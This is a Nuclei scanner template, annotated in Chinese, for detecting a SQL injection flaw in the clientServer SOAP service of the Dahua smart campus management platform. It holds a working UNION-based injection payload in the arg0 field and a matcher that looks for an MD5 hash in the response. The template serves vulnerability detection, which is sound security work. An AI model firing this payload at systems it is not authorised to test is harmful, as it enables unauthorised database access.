MyNuclei/大华智慧园区综合管理平台clientServer存在SQL注入漏洞.yaml

id: dahuazhihuiyuanqu-clientServer-sqli

info:
  name: 大华智慧园区综合管理平台clientServer存在SQL注入漏洞 
  author: candada
  severity: high
  description: '大华智慧园区综合管理平台是一款综合管理平台，具备园区运营、资源调配和智能服务等功能。平台意在协助优化园区资源分配，满足多元化的管理需求，同时通过提供智能服务，增强使用体验。'
  reference:
    - https://mp.weixin.qq.com/s/kOQbig-SuBHLuWIl4Be-Ow
  tags: 2024,大华,sqli,dahua-wpms
  classification:
    cvss-metrics: 
    cvss-score:                                                   
    cve-id:                                              
    cwe-id:                                                    
    epss-score:                                              
    epss-percentile:                                           
    cpe: 
http:
  - raw:
      - |-
        POST /portal/services/clientServer HTTP/1.1
        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Host: {{Hostname}}
        Content-Type: text/xml;charset=UTF-8
        Content-Length: 436

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:cli="http://clientServer.webservice.dssc.dahua.com">
          <soapenv:Header/>
          <soapenv:Body>
          <cli:getGroupInfoListByGroupId>
            <!--type: string-->
              <arg0>-5398) UNION ALL SELECT 5336,5336,5336,5336,md5(123456)-- -</arg0>
            <!--type: long-->
            <arg1>10</arg1>
            </cli:getGroupInfoListByGroupId>
            </soapenv:Body>
          </soap:Envelope>

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - e10adc3949ba59ab
      - type: status
        status:
          - 200
